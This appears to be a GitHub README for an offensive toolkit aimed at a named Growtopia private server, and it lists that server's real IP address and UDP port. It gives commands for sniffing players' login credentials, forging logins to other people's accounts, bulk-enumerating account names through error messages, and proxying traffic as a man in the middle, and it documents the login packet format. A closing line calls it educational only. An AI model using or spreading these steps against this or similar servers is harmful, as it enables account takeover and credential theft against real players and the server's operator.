# Piter Tools — GTPS Packet Sniffer & Exploitation Toolkit

Toolkit buat intercept, sniff, dan exploit traffic Growtopia Private Server
(Piter Server). Bekerja langsung di layer ENet/UDP — bypass WebView entirely.

## Target

- **IP**: 103.129.148.178
- **Game port**: UDP 17091
- **Server**: Piter Server (Windows Server 2022, DRASTORE-based)
- **Auth**: FAKE — HTTP layer menerima semua credential, tapi game server (ENet) ngecek password dari file player di disk

## Install

```bash
git clone https://github.com/nabenns/piter-tools.git
cd piter-tools
chmod +x piter_sniff.py piter_setup.sh
```

Python 3.7+. No external dependencies — pure stdlib.

## Usage

### 1. SNIFF — Capture traffic pas main
```bash
sudo python3 piter_sniff.py sniff
```
Buka Growtopia, login — semua packet ENet ke-capture (GrowID, password, response server).

### 2. FORGE — Login ke akun siapa aja tanpa client GT
```bash
python3 piter_sniff.py forge <GrowID> <password>
```
Bypass WebView — kirim ENet packet langsung ke UDP 17091.

### 3. BRUTE — Enumerate GrowID massal
```bash
echo -e "piterp\nadmin\nOwner\nPiter\nroot" > growids.txt
python3 piter_sniff.py brute growids.txt
```
Auto-detect: "invalid credentials" = akun ADA, "not found" = skip.

### 4. PROXY — MITM (modify/block/replay packets)
```bash
sudo python3 piter_sniff.py proxy
```

## Protocol

Server Piter menggunakan DRASTORE (41-field ENet), tapi packet login pakai
format Gurotopia (5-field pipe-delimited):
```
requestedName|GrowID
tankIDName|GrowID
tankIDPass|password
_token=timestamp&growId=GrowID&password=pass&reg=0
```

HTTP layer (port 80/443/5000) 100% echo — tidak validasi, tidak menulis ke disk.
Game server ENet yang sebenarnya membaca player file dari filesystem.

## Disclaimer

Educational / authorized pentesting only.
